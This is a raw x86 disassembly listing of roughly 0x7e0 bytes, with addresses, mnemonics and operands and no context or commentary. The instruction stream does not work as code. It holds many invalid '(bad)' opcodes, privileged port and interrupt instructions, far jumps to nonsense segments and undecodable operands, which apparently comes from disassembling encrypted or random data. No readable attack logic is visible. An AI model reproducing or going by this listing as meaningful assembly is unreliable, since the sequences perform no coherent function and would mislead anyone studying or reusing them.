  406bc2:	rcl    edx,0x3d
  406bc5:	hlt    
  406bc6:	aad    0x1c
  406bc8:	imul   edx,esp,0x22
  406bcb:	aaa    
  406bcc:	dec    ebx
  406bcd:	hlt    
  406bce:	mov    ch,0x88
  406bd0:	mov    dl,0xf
  406bd2:	jmp    0x59bd:0x3f2b7fe1
  406bd9:	cmp    DWORD PTR [ecx],edi
  406bdb:	pop    edx
  406bdc:	cmp    bl,BYTE PTR [ebp+0x47]
  406bdf:	test   DWORD PTR [ebp-0x2e],esp
  406be2:	adc    ecx,DWORD PTR gs:[ecx+0x4b]
  406be6:	push   cs
  406be7:	cmp    DWORD PTR [edi-0x50a4150c],eax
  406bed:	mov    ebp,DWORD PTR ss:[esp+ebp*4+0x2f]
  406bf2:	lods   al,BYTE PTR ds:[esi]
  406bf3:	test   eax,0x1c896d62
  406bf8:	mov    al,ds:0x7cf01c58
  406bfd:	mov    ch,0x78
  406bff:	nop
  406c00:	dec    ebx
  406c01:	or     eax,0x69112dc0
  406c06:	inc    ebx
  406c07:	test   al,0x82
  406c09:	aas    
  406c0a:	iret   
  406c0b:	mov    ecx,0xd37862d2
  406c10:	or     BYTE PTR [edx],ch
  406c12:	cwde   
  406c13:	outs   dx,DWORD PTR ds:[esi]
  406c14:	and    ch,bh
  406c16:	cmp    al,0xf2
  406c18:	or     al,0xe9
  406c1a:	push   edx
  406c1b:	push   0xa09c8f97
  406c20:	mov    DWORD PTR [edx+0x2f],edx
  406c23:	test   bh,al
  406c25:	jmp    0x4c:0x54d68a22
  406c2c:	mov    al,ds:0x2410120e
  406c31:	mov    WORD PTR ds:0x5e9379de,gs
  406c37:	rcl    bh,cl
  406c39:	lods   al,BYTE PTR ds:[esi]
  406c3a:	rcr    DWORD PTR ds:0x6d90ec72,0xeb
  406c41:	inc    eax
  406c42:	cmp    DWORD PTR [ecx-0x60375f56],edx
  406c48:	jne    0x406c6b
  406c4a:	mov    al,0xe4
  406c4c:	mov    cl,0xbb
  406c4e:	mov    ds:0x78cfb8b2,al
  406c53:	stc    
  406c54:	jmp    0x55a8:0x66040aaa
  406c5b:	lea    edx,[ebx-0x2d]
  406c5e:	fs jmp 0x406c25
  406c61:	(bad)  
  406c62:	fld    DWORD PTR [ebp-0x74]
  406c65:	push   es
  406c66:	and    esi,DWORD PTR [edx+0x44e83ffb]
  406c6c:	pop    es
  406c6d:	sbb    al,0x61
  406c6f:	shl    esp,0xd7
  406c72:	jg     0x406c1f
  406c74:	jmp    0x406c2e
  406c76:	ss dec esi
  406c78:	fadd   QWORD PTR [esi+ebp*8+0x2b]
  406c7c:	ret    0x5c5b
  406c7f:	js     0x406c0a
  406c81:	push   esi
  406c82:	test   al,bh
  406c84:	gs iret 
  406c86:	aas    
  406c87:	cmp    al,0x6e
  406c89:	dec    edx
  406c8a:	mov    ds:0xd985761b,eax
  406c8f:	xor    eax,0x2b68a4df
  406c94:	xor    eax,DWORD PTR [esi-0x6e]
  406c97:	sti    
  406c98:	push   ds
  406c99:	mov    cl,0xe3
  406c9b:	and    BYTE PTR [edx-0x44],ah
  406c9e:	fsubr  QWORD PTR [edi]
  406ca0:	shl    BYTE PTR [edx+edi*1+0x444252c2],1
  406ca7:	test   al,0xa3
  406ca9:	pop    edi
  406caa:	jl     0x406cf2
  406cac:	lea    esi,[ebx+0x7]
  406caf:	popf   
  406cb0:	neg    esi
  406cb2:	mov    dh,0x26
  406cb4:	xchg   bl,bl
  406cb6:	dec    esp
  406cb7:	push   ebx
  406cb8:	or     eax,0x735b6016
  406cbd:	je     0x406cbf
  406cbf:	ss and al,0x70
  406cc2:	lods   eax,DWORD PTR ds:[esi]
  406cc3:	test   eax,0xfcfb33f4
  406cc8:	add    eax,0x5b6efedb
  406ccd:	fidivr WORD PTR [edx-0x699b9c46]
  406cd3:	mov    al,ds:0x22f93e84
  406cd8:	cs scas eax,DWORD PTR es:[edi]
  406cda:	sbb    BYTE PTR [edi-0x4e],al
  406cdd:	popf   
  406cde:	push   ecx
  406cdf:	add    esi,ebp
  406ce1:	cmc    
  406ce2:	mov    dl,0x94
  406ce4:	retf   0x9785
  406ce7:	fwait
  406ce8:	dec    ecx
  406ce9:	add    DWORD PTR [edi],edi
  406ceb:	mov    al,ds:0xf6562842
  406cf0:	push   es
  406cf1:	xlat   BYTE PTR ds:[ebx]
  406cf2:	jno    0x406d16
  406cf4:	sub    eax,0xa93ac44
  406cf9:	mov    al,0xa0
  406cfb:	dec    eax
  406cfc:	ins    BYTE PTR es:[edi],dx
  406cfd:	call   0xb243735c
  406d02:	repnz push ebx
  406d04:	js     0x406cf5
  406d06:	xchg   edi,eax
  406d07:	push   ss
  406d08:	addr16 inc ecx
  406d0a:	and    bh,BYTE PTR ds:0x8ab98bbc
  406d10:	xchg   esi,eax
  406d11:	dec    edi
  406d12:	fisttp DWORD PTR [ecx-0x63db64f0]
  406d18:	mov    ds:0x3fc4fa03,eax
  406d1d:	nop
  406d1e:	adc    BYTE PTR [edi+0x58],0xc9
  406d22:	cli    
  406d23:	shl    BYTE PTR [ebx-0x7],1
  406d26:	pop    edx
  406d27:	inc    si
  406d29:	mov    ch,bh
  406d2b:	push   ecx
  406d2c:	inc    edx
  406d2d:	aad    0x35
  406d2f:	jg     0x406cb7
  406d31:	mov    ah,0x74
  406d33:	jno    0x406cbf
  406d35:	imul   ebp,DWORD PTR [esi+0x59],0x5b
  406d39:	xchg   edx,eax
  406d3a:	mov    ah,0x3f
  406d3c:	ds and bl,al
  406d3f:	push   esi
  406d40:	cmp    esp,ecx
  406d42:	fsub   st,st(2)
  406d44:	push   esi
  406d45:	out    dx,al
  406d46:	aad    0x84
  406d48:	mov    al,0x6a
  406d4a:	out    dx,eax
  406d4b:	dec    edi
  406d4c:	push   edx
  406d4d:	cmp    esp,edx
  406d4f:	aad    0x4c
  406d51:	sub    eax,0xf7cc0a1a
  406d56:	out    dx,al
  406d57:	xor    cl,0xbe
  406d5a:	jmp    0x406c:0xfb6e84dc
  406d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d62:	mov    bl,0x8d
  406d64:	mov    ds:0xb825cc81,al
  406d69:	fldcw  WORD PTR [esi]
  406d6b:	or     DWORD PTR [esi-0x25],ebp
  406d6e:	stos   DWORD PTR es:[edi],eax
  406d6f:	ja     0x406d4c
  406d71:	mov    ah,0x5a
  406d73:	xchg   ebx,eax
  406d74:	sub    BYTE PTR [ebx],dl
  406d76:	leave  
  406d77:	ja     0x406d3b
  406d79:	mov    dl,BYTE PTR [ebx-0x6462407d]
  406d7f:	inc    ebp
  406d80:	arpl   sp,ax
  406d82:	xchg   edx,esp
  406d84:	rcl    DWORD PTR ds:0xc064112c,cl
  406d8a:	lea    eax,[ebp-0x69]
  406d8d:	push   ds
  406d8e:	adc    bh,ah
  406d90:	(bad)  
  406d92:	leave  
  406d93:	xor    DWORD PTR [ebx],eax
  406d95:	retf   
  406d96:	add    esp,DWORD PTR [ebx]
  406d98:	lods   al,BYTE PTR ds:[esi]
  406d99:	jbe    0x406dc0
  406d9b:	lods   al,BYTE PTR ds:[esi]
  406d9c:	mov    al,0xab
  406d9e:	cmp    al,0xa9
  406da0:	fldenv [ebp-0x28]
  406da3:	push   0x2e0aba3e
  406da8:	xor    cl,BYTE PTR [ebx+0x40]
  406dab:	js     0x406d4e
  406dad:	imul   esi,DWORD PTR [edi+esi*4],0x59
  406db1:	in     eax,dx
  406db2:	ins    BYTE PTR es:[edi],dx
  406db3:	push   ecx
  406db4:	sahf   
  406db5:	retf   
  406db6:	(bad)  
  406db7:	sti    
  406db8:	mov    ebx,0x368aea84
  406dbd:	clc    
  406dbe:	nop
  406dbf:	mov    ds,WORD PTR [ebx-0x52b61772]
  406dc5:	sbb    eax,0x48d46316
  406dca:	jmp    0x5979:0x4e9d309b
  406dd1:	inc    ebx
  406dd2:	shl    DWORD PTR [ecx-0x6b],1
  406dd5:	rol    DWORD PTR [edi],0x9f
  406dd8:	jmp    0x406e41
  406dda:	push   esp
  406ddb:	mov    esp,0x349c314d
  406de0:	pop    ds
  406de1:	sub    ch,ah
  406de3:	gs adc eax,0xa4438bbd
  406de9:	out    dx,eax
  406dea:	mov    ch,BYTE PTR [esi+0x1e]
  406ded:	xchg   ebx,eax
  406dee:	retf   0x657d
  406df1:	dec    esi
  406df2:	fiadd  DWORD PTR [edx]
  406df4:	mov    BYTE PTR [ebx+0x375610e2],0x40
  406dfb:	push   eax
  406dfc:	scas   al,BYTE PTR es:[edi]
  406dfd:	stos   BYTE PTR es:[edi],al
  406dfe:	hlt    
  406dff:	jnp    0x406e67
  406e01:	cld    
  406e02:	jno    0x406d9a
  406e04:	and    esp,DWORD PTR [edi]
  406e06:	inc    ecx
  406e07:	cmp    ch,bh
  406e09:	scas   al,BYTE PTR es:[edi]
  406e0a:	mov    ds:0xbb22b5d2,al
  406e0f:	dec    esi
  406e10:	out    0x3d,eax
  406e12:	push   edx
  406e13:	push   ds
  406e14:	jecxz  0x406dec
  406e16:	enter  0xbc02,0xa5
  406e1a:	cmp    ebx,0x36
  406e1d:	xor    eax,0xd794f8ae
  406e22:	addr16 popa 
  406e24:	sub    BYTE PTR [edx+eiz*8-0x3e57e469],ch
  406e2b:	retf   
  406e2c:	mov    ah,BYTE PTR [ebx]
  406e2e:	mov    BYTE PTR [esi+0x64],bh
  406e31:	and    al,0xc8
  406e33:	or     BYTE PTR [ebp-0x22735aa7],0x2b
  406e3a:	loope  0x406e75
  406e3c:	aaa    
  406e3d:	cmp    eax,0x2f99d936
  406e42:	inc    ecx
  406e43:	cmp    eax,0xefd26381
  406e48:	aad    0xe2
  406e4a:	ficomp DWORD PTR [ebx-0x1a]
  406e4d:	jb     0x406ebb
  406e4f:	mov    WORD PTR [edx+0x77],ss
  406e52:	bound  eax,QWORD PTR [ecx+0x5281dae0]
  406e58:	stc    
  406e59:	and    BYTE PTR [edi-0x1db18383],0x30
  406e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e61:	les    esp,FWORD PTR [edx+0x1ab97091]
  406e67:	sub    al,0x2d
  406e69:	test   eax,0xeba3e284
  406e6e:	(bad)  
  406e6f:	jmp    0x406e1d
  406e71:	mov    dh,0x8b
  406e73:	repnz stos DWORD PTR es:[edi],eax
  406e75:	lock clc 
  406e77:	aaa    
  406e78:	xor    cl,BYTE PTR [ebx-0x7f]
  406e7b:	(bad)  
  406e7c:	jnp    0x406e53
  406e7e:	adc    DWORD PTR [eax-0x2219835b],ebp
  406e84:	(bad)  [esi+0x7b]
  406e87:	in     al,dx
  406e88:	outs   dx,DWORD PTR ds:[esi]
  406e89:	sbb    DWORD PTR [edi],0x2f
  406e8c:	jmp    0x406e5e
  406e8e:	pop    es
  406e8f:	cmp    BYTE PTR [ebx-0x519e9cad],0x3d
  406e96:	scas   al,BYTE PTR es:[edi]
  406e97:	xchg   ecx,eax
  406e98:	mov    ah,0xf4
  406e9a:	pop    esi
  406e9b:	jno    0x406e6a
  406e9d:	loop   0x406e86
  406e9f:	inc    esi
  406ea0:	mov    ah,BYTE PTR [esi-0x3c5a74c]
  406ea6:	adc    al,0xe1
  406ea8:	xor    al,0x78
  406eaa:	stos   DWORD PTR es:[edi],eax
  406eab:	push   ss
  406eac:	fsub   DWORD PTR [edx-0x1d3d1139]
  406eb2:	fwait
  406eb3:	xor    BYTE PTR [ebp-0x4c],dl
  406eb6:	jae    0x406e98
  406eb8:	add    esp,DWORD PTR [ebx-0x419c78be]
  406ebe:	leave  
  406ebf:	jp     0x406e9a
  406ec1:	fist   WORD PTR [edx]
  406ec3:	and    BYTE PTR [eax-0x54af414f],dh
  406ec9:	jmp    0x406ef0
  406ecb:	lods   eax,DWORD PTR ds:[esi]
  406ecc:	mov    edx,0x2393a179
  406ed1:	xchg   esp,eax
  406ed2:	xor    al,0x4d
  406ed4:	inc    ecx
  406ed5:	adc    DWORD PTR [edx+ebx*2-0x6d57b3a4],edx
  406edc:	xchg   esp,eax
  406edd:	mov    eax,0x75ba5e16
  406ee2:	lahf   
  406ee3:	inc    esi
  406ee4:	push   edx
  406ee5:	aam    0xef
  406ee7:	sbb    ch,bh
  406ee9:	fmulp  st(3),st
  406eeb:	sbb    eax,DWORD PTR [edx]
  406eed:	and    al,0xcb
  406eef:	pop    eax
  406ef0:	sbb    DWORD PTR [eax],esi
  406ef2:	test   eax,0x313b4c61
  406ef7:	push   0xd719f932
  406efc:	mov    dh,0x4c
  406efe:	out    0x76,al
  406f00:	pop    ebx
  406f01:	xchg   ebp,eax
  406f02:	mov    ah,0x37
  406f04:	ret    0x76c7
  406f07:	rcl    BYTE PTR [edi],cl
  406f09:	sahf   
  406f0a:	div    BYTE PTR ds:0xc7052f55
  406f10:	ret    
  406f11:	sahf   
  406f12:	sub    ah,BYTE PTR [esi-0x40398ab5]
  406f18:	icebp  
  406f19:	rcl    BYTE PTR [ebx-0x4ea37b23],cl
  406f1f:	call   0x49d6:0x3a10aba1
  406f26:	push   eax
  406f27:	(bad)  
  406f28:	mov    ch,dl
  406f2a:	xchg   DWORD PTR [edx],ecx
  406f2c:	cmp    eax,0x608ba763
  406f31:	std    
  406f32:	aaa    
  406f33:	idiv   DWORD PTR [ebp+0x13889372]
  406f39:	mov    edx,0x22a1ff11
  406f3e:	mov    ecx,0x980a9364
  406f43:	push   esp
  406f44:	gs jae 0x406eef
  406f47:	jl     0x406ee5
  406f49:	je     0x406f66
  406f4b:	adc    ecx,DWORD PTR [edi+0x3c6997b7]
  406f51:	xor    BYTE PTR [edi-0x2007312],bh
  406f57:	and    eax,eax
  406f59:	jl     0x406fc3
  406f5b:	sub    al,BYTE PTR [edi+ebp*2]
  406f5e:	test   DWORD PTR [ebx-0x363c2108],esi
  406f64:	inc    ebp
  406f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f66:	or     DWORD PTR [ebp-0x5d],0xa32ef0d2
  406f6d:	and    dh,bh
  406f6f:	repz mov dl,0x2a
  406f72:	clc    
  406f73:	enter  0x1441,0x71
  406f77:	sbb    DWORD PTR [ecx-0xa],0x36
  406f7b:	ja     0x406f4f
  406f7d:	sti    
  406f7e:	pop    ebx
  406f7f:	idiv   dh
  406f81:	mov    edx,0x1c374ffc
  406f86:	lods   eax,DWORD PTR ds:[esi]
  406f87:	int    0xdb
  406f89:	(bad)  
  406f8a:	cmp    al,0x5d
  406f8c:	icebp  
  406f8d:	push   cs
  406f8e:	xchg   esi,eax
  406f8f:	in     al,0x2f
  406f91:	sbb    ah,BYTE PTR [edx-0x7a52d460]
  406f97:	add    eax,0x7a07abc7
  406f9c:	jp     0x406f7a
  406f9e:	mov    eax,0xebc1fb84
  406fa3:	pusha  
  406fa4:	mov    eax,ds:0xd142feb3
  406fa9:	inc    eax
  406faa:	sub    al,0xf4
  406fac:	rcr    bh,0x61
  406faf:	pop    edx
  406fb0:	out    0x1a,al
  406fb2:	retf   
  406fb3:	fs push es
  406fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fb6:	cdq    
  406fb7:	test   DWORD PTR [esi-0x25],edx
  406fba:	or     edi,DWORD PTR [ebx]
  406fbc:	and    BYTE PTR [ecx+0x6d25b376],0xd4
  406fc3:	lahf   
  406fc4:	jnp    0x40701a
  406fc6:	iret   
  406fc7:	(bad)  
  406fc8:	(bad)  
  406fc9:	fs xchg ah,ah
  406fcc:	push   ebx
  406fcd:	int    0x41
  406fcf:	mov    BYTE PTR [ebx],ch
  406fd1:	cmp    BYTE PTR [edx],al
  406fd3:	loope  0x407047
  406fd5:	sbb    cl,BYTE PTR [esi]
  406fd7:	movaps xmm7,xmm1
  406fda:	and    edi,ecx
  406fdc:	mov    bh,0x40
  406fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fdf:	pop    edx
  406fe0:	mov    esp,0x6a9576b8
  406fe5:	test   eax,0x8b7967b1
  406fea:	cmp    al,0x9d
  406fec:	mov    ch,0xae
  406fee:	retf   0x3836
  406ff1:	das    
  406ff2:	fsubp  st(6),st
  406ff4:	addr16 mov edx,0x6f59d385
  406ffa:	pop    eax
  406ffb:	dec    edi
  406ffc:	leave  
  406ffd:	out    dx,al
  406ffe:	stc    
  406fff:	xor    al,0xbb
  407001:	jno    0x407056
  407003:	mov    cl,0xd1
  407005:	xchg   ebx,eax
  407006:	jp     0x407065
  407008:	out    dx,al
  407009:	sub    al,0x5e
  40700b:	add    al,BYTE PTR [esi]
  40700d:	mov    ebx,0xa9abfd35
  407012:	mov    ds,WORD PTR [esi+0x57b7fd3f]
  407018:	retf   0xa8c
  40701b:	in     al,dx
  40701c:	mov    BYTE PTR [edx-0x4a],al
  40701f:	mov    cl,0x1d
  407021:	rcl    BYTE PTR [eax],cl
  407023:	mov    al,0x14
  407025:	in     al,0xb7
  407027:	add    ebx,DWORD PTR [ebp-0x7a]
  40702a:	sub    al,0xe8
  40702c:	cs out 0xf7,al
  40702f:	sbb    DWORD PTR [edi-0x7386d049],0xffffff83
  407036:	add    eax,0x4fdd99c6
  40703b:	push   ecx
  40703c:	mov    DWORD PTR ds:0x78f0aab5,ebx
  407042:	repz shr DWORD PTR [ecx+0x223f59bf],cl
  407049:	pop    esp
  40704a:	jb     0x406fdb
  40704c:	dec    edi
  40704d:	(bad)  
  40704e:	in     al,0x5f
  407050:	jp     0x40700c
  407052:	cwde   
  407053:	iret   
  407054:	sbb    DWORD PTR [ecx+0x6f7a8653],esp
  40705a:	lea    ebp,[ebp-0x5bee6c5]
  407060:	call   0xb0c0db1b
  407065:	mov    ah,0x34
  407067:	jg     0x40706a
  407069:	pop    ecx
  40706a:	imul   esi,DWORD PTR ds:0xe087c7a0,0x78
  407071:	sbb    ebp,DWORD PTR [ecx-0x47c92edc]
  407077:	mov    al,ds:0xd8f15d77
  40707c:	repnz out dx,eax
  40707e:	int    0x61
  407080:	aas    
  407081:	add    eax,0xe9163c7f
  407086:	int    0x0
  407088:	jg     0x4070d8
  40708a:	jp     0x40704b
  40708c:	mov    esi,0xc50007be
  407091:	or     edi,DWORD PTR [edi-0xb1148d]
  407097:	sub    al,0x23
  407099:	mov    ds,WORD PTR [edx]
  40709b:	adc    ch,dh
  40709d:	popa   
  40709e:	sbb    ah,ch
  4070a0:	loope  0x407040
  4070a2:	iret   
  4070a3:	inc    esi
  4070a4:	dec    edx
  4070a5:	nop
  4070a6:	inc    ecx
  4070a7:	out    0xfd,al
  4070a9:	or     ah,ch
  4070ab:	sub    al,0xa
  4070ad:	dec    ecx
  4070ae:	pop    esp
  4070af:	mov    esp,0xc41f951c
  4070b4:	sub    al,0x92
  4070b7:	popf   
  4070b8:	stos   DWORD PTR es:[edi],eax
  4070b9:	add    ch,BYTE PTR [ecx]
  4070bb:	jmp    0x8a12a0dc
  4070c0:	call   0xebca2881
  4070c5:	push   ebp
  4070c6:	pop    ebp
  4070c7:	fild   DWORD PTR [ebp-0x52c3083a]
  4070cd:	repz fnstenv [edi-0x1a]
  4070d1:	in     al,0x8e
  4070d3:	sbb    BYTE PTR [eax-0x1c],0x1c
  4070d7:	fcmovnu st,st(4)
  4070d9:	(bad)  
  4070da:	icebp  
  4070db:	jecxz  0x40711b
  4070dd:	xchg   DWORD PTR [esi-0x7b],esi
  4070e0:	scas   eax,DWORD PTR es:[edi]
  4070e1:	bound  edi,QWORD PTR [esi-0x4388a4f]
  4070e7:	jp     0xbeeaccbd
  4070ed:	pusha  
  4070ee:	out    0x56,eax
  4070f0:	lods   al,BYTE PTR ds:[esi]
  4070f1:	imul   esi,DWORD PTR [edx+0x32],0xffffffa2
  4070f5:	jmp    0x9adf:0xc16dec9f
  4070fc:	lods   eax,DWORD PTR ds:[esi]
  4070fd:	das    
  4070fe:	pop    ecx
  4070ff:	ds xchg ebx,eax
  407101:	pop    ecx
  407102:	(bad)  
  407104:	jle    0x4070df
  407106:	mov    dh,0xdc
  407108:	xchg   esp,eax
  407109:	loopne 0x407091
  40710b:	sbb    al,0x63
  40710d:	jnp    0x407162
  40710f:	push   edi
  407110:	mov    cl,0x9f
  407112:	clc    
  407113:	push   esp
  407114:	pushf  
  407115:	sbb    edx,0x48
  407118:	add    bh,dh
  40711a:	imul   esi
  40711c:	stos   DWORD PTR es:[edi],eax
  40711d:	outs   dx,BYTE PTR ds:[esi]
  40711e:	mov    eax,ds:0x3c923229
  407123:	mov    esi,0x512c140f
  407128:	mov    ebp,DWORD PTR [ebp+ebx*2+0x7c]
  40712c:	ins    DWORD PTR es:[edi],dx
  40712d:	imul   ebp,DWORD PTR [eax+0x7081fd69],0x3e
  407134:	cmc    
  407135:	sbb    DWORD PTR [ebx-0x768791fc],esi
  40713b:	add    al,0x45
  40713d:	test   DWORD PTR [ebx-0x49],esi
  407140:	rol    DWORD PTR [eax],cl
  407142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407143:	add    BYTE PTR [esi+0x38],ch
  407146:	lods   eax,DWORD PTR ds:[esi]
  407147:	fcomp  QWORD PTR [ecx-0x1420e157]
  40714d:	stos   DWORD PTR es:[edi],eax
  40714e:	dec    edi
  40714f:	mov    edx,0x226f022e
  407154:	xchg   al,dl
  407156:	xor    BYTE PTR [eax],cl
  407158:	xor    al,0xfe
  40715a:	push   ebx
  40715b:	or     al,0x44
  40715d:	inc    ebp
  40715e:	inc    ebp
  40715f:	pop    es
  407160:	push   esi
  407161:	xor    al,0x93
  407163:	dec    edx
  407164:	ja     0x4071ae
  407166:	fstp   QWORD PTR [ebp-0x55]
  407169:	cmp    al,0x50
  40716b:	inc    ebp
  40716c:	xchg   edi,eax
  40716d:	aas    
  40716e:	mov    ah,0xa
  407170:	test   eax,0x6d84699f
  407175:	or     al,0x5b
  407177:	ret    0x9611
  40717a:	cld    
  40717b:	xchg   BYTE PTR [ebx],cl
  40717d:	xchg   ebx,eax
  40717e:	mov    ah,0x81
  407180:	mov    ah,0xc1
  407182:	mov    edx,0x33db305d
  407187:	cwde   
  407188:	push   es
  407189:	jmp    0x6286:0xee3e4ab9
  407190:	push   ebp
  407191:	xchg   ecx,eax
  407192:	lea    edx,[eax+0x28]
  407195:	mov    bl,0xf6
  407197:	inc    ecx
  407198:	mul    dl
  40719a:	das    
  40719b:	push   esi
  40719c:	jecxz  0x4071a5
  40719e:	jmp    0x5957:0x8d63b3b3
  4071a5:	mov    bh,0x67
  4071a7:	into   
  4071a8:	test   DWORD PTR [ecx],edi
  4071aa:	fmul   st,st(2)
  4071ac:	jecxz  0x40718b
  4071ae:	nop
  4071af:	ret    
  4071b0:	icebp  
  4071b1:	out    0x61,eax
  4071b3:	fisttp WORD PTR [eax+0x30b3f29b]
  4071b9:	int3   
  4071ba:	mov    edx,0x5c9fbc72
  4071bf:	mov    dh,0x2e
  4071c1:	pop    edx
  4071c2:	fs jecxz 0x40722b
  4071c5:	push   ss
  4071c6:	push   DWORD PTR [ebx-0x56dce3b2]
  4071cc:	outs   dx,BYTE PTR ds:[esi]
  4071cd:	xchg   DWORD PTR [ebp-0xc8c4e9c],ecx
  4071d3:	mov    ebp,0x7febd4bf
  4071d8:	xchg   esp,eax
  4071d9:	jno    0x40718c
  4071db:	adc    cl,BYTE PTR [edi+0x23]
  4071de:	dec    esp
  4071df:	cdq    
  4071e0:	(bad)  
  4071e1:	sbb    al,0xd
  4071e3:	std    
  4071e4:	push   ecx
  4071e5:	pushf  
  4071e6:	pop    esi
  4071e7:	iret   
  4071e8:	push   cs
  4071e9:	or     al,0x4
  4071eb:	jecxz  0x407269
  4071ed:	fmul   st,st(4)
  4071ef:	repz bound esi,QWORD PTR [edx+0x2b]
  4071f3:	je     0x407256
  4071f5:	addr16 cdq 
  4071f7:	add    eax,DWORD PTR [ebx+ebx*4-0x3494fe76]
  4071fe:	add    eax,0xd963a990
  407203:	inc    ebp
  407204:	mov    ds:0xcd0c19d8,eax
  407209:	xchg   DWORD PTR es:[ebx-0x3a],esi
  40720d:	jo     0x40720a
  40720f:	or     eax,0x9ae978ef
  407214:	xor    ebx,DWORD PTR [ebx+0x7d]
  407217:	push   eax
  407218:	aad    0x4f
  40721a:	push   ebp
  40721b:	int3   
  40721c:	in     eax,dx
  40721d:	ret    0xedce
  407220:	push   ds
  407221:	(bad)  
  407222:	cli    
  407223:	out    0x4e,al
  407225:	lea    ebp,[ecx+0x265afae0]
  40722b:	rcr    BYTE PTR [ebx+0x136516dd],cl
  407231:	into   
  407232:	push   ds
  407233:	sub    DWORD PTR ds:0x6392b74,0xffffff80
  40723a:	pushf  
  40723b:	or     al,0x2d
  40723d:	(bad)  
  40723e:	push   ecx
  40723f:	and    esi,edx
  407241:	mov    al,ds:0xc85a1aff
  407246:	xchg   esp,eax
  407247:	test   DWORD PTR [ebx+ecx*8],esp
  40724a:	mov    ebp,0xf98eb0b9
  40724f:	add    DWORD PTR [ecx],edx
  407251:	je     0x4072ab
  407253:	dec    esp
  407254:	out    dx,eax
  407255:	sahf   
  407256:	mov    edx,0x8e87c09d
  40725b:	mov    esp,DWORD PTR [eax-0x11dbc86f]
  407261:	cmp    DWORD PTR [eax+eiz*2+0x1b],edi
  407265:	cmp    DWORD PTR [ebp+0x3a],esi
  407268:	add    ebx,DWORD PTR ds:0xca132984
  40726e:	xor    bh,bh
  407270:	lods   al,BYTE PTR ds:[esi]
  407271:	jne    0x40728d
  407273:	xor    eax,0x13fe5759
  407278:	scas   eax,DWORD PTR es:[edi]
  407279:	mov    al,ds:0x6432fa05
  40727e:	cmp    al,0xd8
  407280:	test   DWORD PTR [edi-0x51],eax
  407283:	fwait
  407284:	jle    0x4072c0
  407286:	call   0x57c9:0x2e3b241b
  40728d:	pop    edi
  40728e:	sar    DWORD PTR [eax-0x585d245e],cl
  407294:	mov    bl,0xe9
  407296:	pop    edi
  407297:	xchg   esi,eax
  407298:	sbb    edi,DWORD PTR [edi+0x43]
  40729b:	mov    ch,0xe8
  40729d:	iret   
  40729e:	call   0x7188edde
  4072a3:	retf   0xae5f
  4072a6:	inc    edx
  4072a7:	sub    ebp,eax
  4072a9:	ja     0x407243
  4072ab:	ror    DWORD PTR [ecx],cl
  4072ad:	mov    DWORD PTR [esi+0x6],edx
  4072b0:	fmul   QWORD PTR [ecx]
  4072b2:	lea    edx,[ecx]
  4072b4:	out    dx,eax
  4072b5:	push   ecx
  4072b6:	dec    ebp
  4072b7:	pop    edi
  4072b8:	scas   eax,DWORD PTR es:[edi]
  4072b9:	dec    esp
  4072ba:	(bad)  
  4072bb:	mov    al,0x60
  4072bd:	xchg   edx,eax
  4072be:	jnp    0x407294
  4072c0:	fidivr DWORD PTR [ecx-0x37550807]
  4072c6:	push   esi
  4072c7:	cmp    BYTE PTR [ecx],ah
  4072c9:	pop    ds
  4072ca:	sub    DWORD PTR [edx],ebx
  4072cc:	or     ecx,DWORD PTR [edx+0x48869289]
  4072d2:	or     eax,0x6cfe5b8d
  4072d7:	xor    al,0x27
  4072da:	pop    ebp
  4072db:	push   ss
  4072dc:	sub    ebx,DWORD PTR [ecx-0x4ea022a3]
  4072e2:	jmp    0xfb12acdc
  4072e7:	mov    WORD PTR [ebx+eax*2],?
  4072ea:	(bad)  
  4072eb:	jmp    0x4072d6
  4072ed:	pop    edx
  4072ee:	jae    0x407361
  4072f0:	xchg   esi,eax
  4072f1:	jmp    0x3ebe69e7
  4072f6:	popf   
  4072f7:	and    DWORD PTR ds:0xc5db7997,0x26
  4072fe:	fisttp DWORD PTR [esp+ecx*8+0x38118562]
  407305:	stc    
  407306:	loope  0x40729a
  407308:	clc    
  407309:	adc    BYTE PTR [ecx+0x14],dl
  40730c:	mov    edi,0x2dfcdbdc
  407311:	cmc    
  407312:	popf   
  407313:	cmp    bl,ch
  407315:	or     edi,DWORD PTR [ebp-0x5b78cfd3]
  40731b:	inc    esi
  40731c:	adc    DWORD PTR [ebx],esi
  40731e:	dec    ebp
  40731f:	add    DWORD PTR ss:[ebx+0x1b7efb46],ecx
  407326:	adc    BYTE PTR [eax+ecx*8+0x4d219f45],dh
  40732d:	pushf  
  40732e:	xor    BYTE PTR [ebx],0x21
  407331:	popf   
  407332:	mov    ?,esp
  407334:	jo     0x40739a
  407336:	cs rcr bl,cl
  407339:	cmp    BYTE PTR [esi],ch
  40733b:	rol    BYTE PTR [ecx],cl
  40733d:	jecxz  0x407356
  40733f:	in     al,dx
  407340:	popf   
  407341:	(bad)  
  407342:	jge    0x4072ea
  407344:	cmc    
  407345:	add    al,0xef
  407347:	and    eax,0x1e069ef2
  40734c:	fwait
  40734d:	and    DWORD PTR [esi+0x2d],ecx
  407350:	into   
  407351:	push   esp
  407352:	mov    eax,ds:0x553ff95a
  407357:	adc    eax,0x8c1a087e
  40735c:	idiv   BYTE PTR [ebx-0x3de71984]
  407362:	enter  0x56d6,0x9b
  407366:	mov    esp,0x9e8d5852
  40736b:	mov    ch,0xf1
  40736d:	pop    eax
  40736e:	sbb    ah,ch
  407370:	push   edx
  407371:	test   al,0x7c
  407373:	ficom  DWORD PTR [esi+0x74686856]
  407379:	cmp    eax,ebx
  40737b:	fisub  WORD PTR [esi+edx*4-0x37]
  40737f:	fst    QWORD PTR [ebx]
  407381:	out    0x2b,eax
  407383:	push   es
  407384:	jbe    0x4073ff
  407386:	cli    
  407387:	lea    edx,[ebp+0x64]
  40738a:	xlat   BYTE PTR ds:[ebx]
  40738b:	shl    DWORD PTR ds:0xa25ea7e0,cl
  407391:	out    dx,al
  407392:	cmc    
  407393:	mov    al,0x8a
  407395:	push   ecx
  407396:	cwde   
  407397:	xchg   DWORD PTR [edx-0x21db8dfb],ebx
  40739d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40739e:	retf   
  40739f:	stos   BYTE PTR es:[edi],al
